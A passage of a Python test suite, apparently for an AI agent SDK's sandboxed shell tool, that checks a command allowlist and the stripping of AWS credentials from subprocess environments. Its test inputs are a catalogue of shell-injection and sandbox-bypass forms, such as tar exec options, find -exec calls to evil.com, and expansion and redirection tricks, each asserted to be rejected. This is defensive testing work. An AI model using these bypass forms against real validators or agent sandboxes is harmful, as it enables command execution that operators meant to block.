        assert not _accepted("ls ~root")
        assert _accepted("ls '~' \\~ a~b")

    def test_unterminated_escape_rejected(self) -> None:
        assert not _accepted("ls \\")
        assert not _accepted('ls "a\\')
        assert _accepted("ls \\\\")

    def test_nul_character_rejected(self) -> None:
        assert not _accepted("ls 'a\0b'")
        assert not _accepted("ls a\0b")

    def test_unterminated_quote_rejected(self) -> None:
        assert not _accepted("ls 'abc")
        assert not _accepted('cat "abc | wc -l')

    def test_abbreviated_exec_options_rejected(self) -> None:
        # GNU getopt accepts any unambiguous prefix of a long option.
        assert not _accepted("tar -cf a.tar d --checkpoint=1 --checkpoint-ac=exec=curl")
        assert not _accepted("tar -xf a.tar --to-comm=curl")
        assert not _accepted("tar -cf a.tar d --use-compress=curl")
        assert not _accepted("sort --compress-prog=curl f")
        assert not _accepted("sort --co curl f")
        # Options that only share a prefix with one of them stay usable.
        assert _accepted("tar --exclude=.git --totals -czf a.tar d")
        assert _accepted("tar -xf a.tar --to-stdout")
        assert _accepted("sort --check f")
        assert _accepted("rg --pretty --pre-glob '*.pdf' pattern")
        assert _accepted("find . -name a -o -name b")
        assert _accepted("tar -cf a.tar -- d")

    def test_tar_script_and_remote_shell_options_rejected(self) -> None:
        assert not _accepted("tar -cf a.tar -M --info-script=curl d")
        assert not _accepted("tar -cf a.tar -M --new-volume-script curl d")
        assert not _accepted("tar -cf a.tar -M -F curl d")
        assert not _accepted("tar -cMFcurl -f a.tar d")
        assert not _accepted("tar -xf host:a.tar --rsh-command=curl")
        assert not _accepted("tar -xf host:a.tar --rmt-command=curl")
        # An archive or directory name attached to -f / -C is not an option letter.
        assert _accepted("tar -cfFiles.tar d")
        assert _accepted("tar -xf a.tar -CInput")

    def test_tar_option_cluster_without_dash_rejected(self) -> None:
        # tar reads a first word without a dash as options: `cIf prog` is `-c -I prog -f`.
        assert not _accepted("tar cIf curl a.tar d")
        assert not _accepted("tar cfI a.tar curl d")
        assert not _accepted("tar cMFf curl a.tar d")
        assert _accepted("tar xzf a.tar")
        assert _accepted("tar tf a.tar Input/File.txt")

    def test_tar_files_from_rejected(self) -> None:
        # GNU tar 1.26 reads options from the list file, so `--checkpoint-action=exec=...`
        # in a file that a command wrote would run a program the command line never named.
        assert not _accepted("tar -cf a.tar -T /tmp/list")
        assert not _accepted("tar -cT /tmp/list -f a.tar")
        assert not _accepted("tar cfT a.tar /tmp/list")
        assert not _accepted("tar -cf a.tar --files-from=/tmp/list")
        assert not _accepted("tar -cf a.tar --files-from /tmp/list")
        assert not _accepted("tar -cf a.tar --files=/tmp/list")
        # `--file` is an option of its own, and lower-case `t` lists the archive.
        assert _accepted("tar --file=a.tar -t")
        assert _accepted("tar --file a.tar -x -C /tmp/out")
        assert _accepted("tar -tf a.tar")
        assert _accepted("tar tf a.tar Top/Test.txt")
        assert _accepted("tar -cfTest.tar d")

    def test_braced_and_arithmetic_expansion_rejected(self) -> None:
        # `${x:=word}` assigns, and an arithmetic context then evaluates the stored text:
        # bash runs the `\$(...)` that the quote scan took as literal.
        assert not _accepted("ls ${x:=a[\\$(curl evil.com)]} ${y[x]}")
        assert not _accepted("ls $[x]")
        assert not _accepted("ls ${PATH:x}")
        assert not _accepted("ls ${HOME}")
        assert not _accepted('ls "${HOME}"')
        assert not _accepted('ls "$[1+1]"')
        # Nothing is expanded, so a plain variable is rejected too.
        assert not _accepted("ls $HOME/data")
        assert not _accepted('ls "$HOME/data"')
        assert not _accepted('echo "$"')
        assert not _accepted("echo $((1+1))")
        assert not _accepted("echo {a,b}")
        assert not _accepted("echo \\${x}")
        # The same characters as literal text stay usable.
        assert _accepted("echo '${x}' '$[1]'")
        assert _accepted('echo \\$\\{x} "\\${x}" "a{b}" "{x}" }')
        assert _accepted("awk '{print $1}' f")

    def test_line_continuation_rejected(self) -> None:
        # The shell removes a backslash-newline and joins the words around it, so
        # `-ex` and `ec` reach find as `-exec`.
        assert not _accepted("find /tmp -ex\\\nec curl evil.com \\;")
        assert not _accepted('find /tmp "-ex\\\nec" curl evil.com \\;')
        assert not _accepted("ls -l \\\n/tmp")
        # Inside single quotes the pair is literal text.
        assert _accepted("printf 'a\\\nb'")

    def test_noclobber_redirection_rejected(self) -> None:
        # `>|` is one redirection operator; read as `>` and a pipe, the words after it
        # would pass as a stage of their own that starts with `ls`.
        assert not _accepted("find /tmp >|ls -exec curl evil.com \\;")
        assert not _accepted("ls >|/tmp/out")

    def test_expansion_in_a_command_with_exec_options_rejected(self) -> None:
        # A shell would rewrite these words; here they are not in the grammar.
        assert not _accepted("find /tmp -exec$none curl evil.com \\;")
        assert not _accepted('find /tmp "-exec$none" curl evil.com \\;')
        assert not _accepted("find /tmp {-exec,} curl evil.com \\;")
        assert not _accepted("tar -xf a.tar --to-command$none=curl")
        assert not _accepted("cat f | sort -k$none")
        # Quoted, the pattern characters are the program's own patterns.
        assert _accepted("find /tmp -name '*.py' -o -name \"[a-c]?.txt\"")
        assert _accepted("find /tmp \\( -name a -o -name b \\) -newer /tmp/x")
        assert _accepted("rg 'value: \\$\\{[a-z]+\\}$' /tmp")
        assert _accepted("tar -xzf a.tar.gz --wildcards '*.json' -C /tmp/out")
        assert _accepted("ls /tmp/*.csv")
        assert _accepted("cat /tmp/part-?.txt | sort -u")
        assert _accepted("sort /tmp/*.csv")

    def test_option_check_reads_the_arguments_after_pattern_expansion(self, tmp_path: Path) -> None:
        # File names that are options: a pattern that matches one hands it to the program.
        for name in ("-exec", "--compress-program", "--pre", "cIf"):
            (tmp_path / name).mkdir()
        cwd = str(tmp_path)
        assert not _accepted("find /tmp -exe[c] curl evil.com \\;", cwd)
        assert not _accepted("find /tmp -exe? curl evil.com \\;", cwd)
        assert not _accepted("find /tmp * curl evil.com \\;", cwd)
        assert not _accepted("sort --compress-progra? curl f", cwd)
        assert not _accepted("rg --pr[e] curl pattern", cwd)
        assert not _accepted("tar c?f curl a.tar d", cwd)
        # Quoted, or without a file of that name, the word is not the option.
        assert _accepted("find /tmp -name '-exe[c]'", cwd)
        assert _accepted("find /tmp -name \\*", cwd)
        assert _accepted("find /tmp -exe[c] curl evil.com \\;")
        assert _accepted("sort --compress-progra? curl f")

    def test_redirection_does_not_hide_an_exec_option(self) -> None:
        # A shell reads `-exec>/dev/null` as `-exec` and a redirection. Here a redirection
        # is a word of its own and is not an argument: tar's first argument is `cIf`.
        assert not _accepted("find /tmp -exec>/dev/null curl evil.com \\;")
        assert not _accepted("find /tmp -exec</dev/null curl evil.com \\;")
        assert not _accepted("sort --compress-program>/dev/null curl f")
        assert not _accepted("tar >/dev/null cIf curl a.tar d")
        assert not _accepted("tar 2>/dev/null cIf curl a.tar d")
        assert not _accepted("tar >/dev/null 2>&1 cIf curl a.tar d")
        assert not _accepted("tar 2>& 1 cIf curl a.tar d")
        assert not _accepted("tar <& 0 cIf curl a.tar d")
        assert not _accepted("tar >& /dev/null cIf curl a.tar d")
        assert not _accepted("tar 2>&1 cIf curl a.tar d")
        assert not _accepted("tar > /dev/null cIf curl a.tar d")
        # Closing a descriptor is not in the grammar, with or without a word behind it.
        assert not _accepted("find /tmp >&--exec curl evil.com \\;")
        assert not _accepted("find /tmp <&--exec curl evil.com \\;")
        assert not _accepted("find /tmp 2>&--exec curl evil.com \\;")
        assert not _accepted("find /tmp >& --exec curl evil.com \\;")
        assert not _accepted("find /tmp >&-''-exec curl evil.com \\;")
        assert not _accepted("tar -cf a.tar 2>&--Icurl d")
        assert not _accepted("tar >&-cIf curl a.tar d")
        assert not _accepted("ls 2>&-")
        assert _accepted("tar -tf a.tar 'a&b' 2>&1")
        assert _accepted("find /tmp -name x 2>/dev/null")
        assert _accepted("find /tmp -name '>' -newer /tmp/x")
        assert _accepted("tar 2>/dev/null xzf a.tar")
        assert _accepted("tar -tf a.tar >/dev/null 2>&1")

    @pytest.mark.parametrize(
        "command",
        [
            "2>{tmp}/ls touch {tmp}/marker",
            "A=/ls touch {tmp}/marker",
            "ls $'\\'' ; touch {tmp}/marker #'",
            "ls #'\ntouch {tmp}/marker #'",
            "tar -cf {tmp}/a.tar -C {tmp} src --checkpoint=1 --checkpoint-ac=exec='touch {tmp}/marker'",
            "tar cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
            "sort --compress-prog='touch {tmp}/marker' -S 1k -T {tmp} /etc/services",
            "find {tmp} -maxdepth 0 ${{x:--exec}} touch {tmp}/marker {{}} +",
            'find {tmp} -maxdepth 0 "${{x:--exec}}" touch {tmp}/marker \\;',
            "tar -cf /dev/null {tmp}/src ${{x:---checkpoint=1}} ${{y:---checkpoint-action=exec=touch\\ {tmp}/marker}}",
            "find {tmp} -maxdepth 0 {{-exec,}} touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 -exe[c] touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 * touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 -exec$none touch {tmp}/marker \\;",
            'find {tmp} -maxdepth 0 "-exec$none" touch {tmp}/marker \\;',
            "find {tmp} -maxdepth 0 -ex\\\nec touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 -exec>/dev/null touch {tmp}/marker \\;",
            "tar 2>& 1 cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
            "tar <& 0 cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
            "tar >& /dev/null cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
            "tar -cf /dev/null -T {tmp}/list",
            "find {tmp} -maxdepth 0 >|ls -exec touch {tmp}/marker \\;",
            "ls ${{x:=a[\\$(touch {tmp}/marker)]}} ${{y[x]}}",
            "ls ${{x:=a[\\$(touch {tmp}/marker)]}} $[x]",
            "ls ${{x:=a[\\$(touch {tmp}/marker)]}} ${{PATH:x}}",
            'ls "${{x:=a[\\$(touch {tmp}/marker)]}}" "${{y[x]}}"',
            # Closing a descriptor, which a shell reads as a whole redirection.
            "find {tmp} -maxdepth 0 >&--exec touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 <&--exec touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 2>&--exec touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 >& --exec touch {tmp}/marker \\;",
            "find {tmp} -maxdepth 0 >&-''-exec touch {tmp}/marker \\;",
            "tar -cf {tmp}/a.tar 2>&--I{tmp}/bin/ls -C {tmp} src",
            "tar >&-cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
            "ls &>/dev/null touch {tmp}/marker",
            # Every other form with which a shell starts a second program or writes a file.
            "ls ; touch {tmp}/marker",
            "ls && touch {tmp}/marker",
            "ls {tmp}/none || touch {tmp}/marker",
            "ls & touch {tmp}/marker",
            "ls\ntouch {tmp}/marker",
            "ls\rtouch {tmp}/marker",
            "echo $(touch {tmp}/marker)",
            'echo "$(touch {tmp}/marker)"',
            "echo `touch {tmp}/marker`",
            'echo "`touch {tmp}/marker`"',
            "echo $((x[$(touch {tmp}/marker)]))",
            "(touch {tmp}/marker)",
            "cat <(touch {tmp}/marker)",
            "ls >(touch {tmp}/marker)",
            "ls | touch {tmp}/marker",
            "ls |& touch {tmp}/marker",
            "cat <<EOF\n$(touch {tmp}/marker)\nEOF",
            "echo x > {tmp}/marker",
            "echo x >> {tmp}/marker",
            "echo x >| {tmp}/marker",
            "echo x 1> {tmp}/marker",
            "echo x >{tmp}/marker 2>&1",
            "echo x &> {tmp}/marker",
            "ls {tmp}/none 2> {tmp}/marker",
            "{tmp}/bin/ls",
            "../bin/ls",
            "../bin/l?",
            "/usr/bin/touch {tmp}/marker",
            "PATH={tmp}/bin ls",
            "echo {{x,$(touch {tmp}/marker)}}",
        ],
    )
    def test_rejected_form_does_not_run_another_program(self, tmp_path: Path, command: str) -> None:
        # `touch` is not on the allowlist. Each command would run it, write the marker
        # through a redirection, or run the `ls` file below, if a shell read it.
        (tmp_path / "src").write_text("x")
        (tmp_path / "bin").mkdir()
        (tmp_path / "bin" / "ls").write_text(f"#!/bin/sh\ntouch {tmp_path}/marker\n")
        (tmp_path / "bin" / "ls").chmod(0o755)
        (tmp_path / "list").write_text(
            f"--checkpoint=1\n--checkpoint-action=exec=touch {tmp_path}/marker\n{tmp_path}/src\n"
        )
        # The working directory holds one entry, for the pattern forms to match.
        (tmp_path / "cwd" / "-exec").mkdir(parents=True)
        with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}):
            result = _run(command.format(tmp=tmp_path), tmp_path / "cwd")
        assert result.startswith("Error:"), result
        assert "Shell execution failed" not in result
        assert not (tmp_path / "marker").exists()

    def test_python_allowed_by_default(self) -> None:
        with mock.patch.dict(os.environ, {}, clear=True):
            assert _accepted("python3 /opt/skills/example/scripts/x.py")

    def test_python_blocked_when_flag_false(self) -> None:
        with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}, clear=True):
            assert not _accepted("python3 x.py")
            # non-python allowlisted command still works
            assert _accepted("ls")


class TestSanitizedEnv:
    """The subprocess env must drop AWS_PROFILE but keep AWS_REGION."""

    def test_aws_profile_stripped_region_kept(self) -> None:
        with mock.patch.dict(
            os.environ,
            {"AWS_PROFILE": "persona", "AWS_REGION": "us-west-2", "PATH": "/usr/bin"},
            clear=True,
        ):
            env = _sanitized_env()
        assert "AWS_PROFILE" not in env
        assert env.get("AWS_REGION") == "us-west-2"
        assert env.get("PATH") == "/usr/bin"

    def test_pythonpath_kept(self) -> None:
        # In an image whose dependencies resolve only through PYTHONPATH, dropping
        # it breaks `import boto3` in every skill script.
        with mock.patch.dict(
            os.environ,
            {"PYTHONPATH": "/opt/agent/site-packages", "PATH": "/usr/bin"},
            clear=True,
        ):
            env = _sanitized_env()
        assert env.get("PYTHONPATH") == "/opt/agent/site-packages"

    @_NEEDS_AWK
    def test_execute_shell_runs_the_command_with_the_sanitized_env(self) -> None:
        parent = {
            "PATH": os.environ.get("PATH", ""),
            "AWS_PROFILE": "persona",
            "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://127.0.0.1:9/creds",
        }
        command = (
            """awk 'BEGIN { printf "%s|%s", ENVIRON["AWS_PROFILE"] ENVIRON["AWS_SECRET_ACCESS_KEY"] """
            """ENVIRON["AWS_CONTAINER_CREDENTIALS_FULL_URI"], ENVIRON["AWS_EC2_METADATA_DISABLED"] }'"""
        )
        with warnings.catch_warnings(), mock.patch.dict(os.environ, parent, clear=True):
            warnings.simplefilter("ignore", FutureWarning)
            result = execute_shell(command=command, working_directory="/tmp")
        assert result == "|true\n[exit code: 0]"

    def test_no_ambient_credentials_in_subprocess(self, tmp_path: Path) -> None:
        # Dummy credentials everywhere botocore looks without an env var (the shared
        # credentials and config files and the legacy boto config under HOME), plus
        # credential vars in the parent env. A subprocess must resolve none of them.
        creds = (
            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        )
        (tmp_path / ".aws").mkdir()
        (tmp_path / ".aws" / "credentials").write_text("[default]\n" + creds)
        (tmp_path / ".aws" / "config").write_text("[default]\n" + creds)
        (tmp_path / ".boto").write_text("[Credentials]\n" + creds)
        parent = {
            "HOME": str(tmp_path),
            "PATH": os.environ.get("PATH", ""),
            "AWS_PROFILE": "default",
            "AWS_REGION": "us-west-2",
            "AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://127.0.0.1:9/creds",
            "AWS_WEB_IDENTITY_TOKEN_FILE": str(tmp_path / "token"),
        }
        with mock.patch.dict(os.environ, parent, clear=True):
            env = _sanitized_env()
        assert env["AWS_EC2_METADATA_DISABLED"] == "true"
        probe = "import botocore.session; print(botocore.session.get_session().get_credentials())"
        out = subprocess.run(
            [sys.executable, "-c", probe], env=env, capture_output=True, text=True, timeout=60
        )
        assert out.stdout.strip() == "None", out.stdout + out.stderr


class TestAgentFactoryShellExecution:
    """Tests for shell execution integration in the agent factory."""

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_enable_shell_adds_tool(self) -> None:
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            agent = create_default_async_orchestrator_with_subagent(
                system_prompt="Test prompt",
                enable_shell=True,
            )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "execute_shell" in tool_names

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_shell_disabled_by_default(self) -> None:
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        agent = create_default_async_orchestrator_with_subagent(
            system_prompt="Test prompt",
        )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "execute_shell" not in tool_names

    @mock.patch.dict(os.environ, {"AWS_REGION": "us-west-2"}, clear=True)
    def test_skills_and_shell_together(self) -> None:
        from agent_builder_sdk.agent_factory import (
            create_default_async_orchestrator_with_subagent,
        )

        with warnings.catch_warnings():
            warnings.simplefilter("ignore", FutureWarning)
            agent = create_default_async_orchestrator_with_subagent(
                system_prompt="Test prompt",
                enable_skills=True,
                enable_shell=True,
            )

        tool_names = [t.tool_name for t in agent.tool_registry.registry.values()]
        assert "skills" in tool_names
        assert "execute_shell" in tool_names
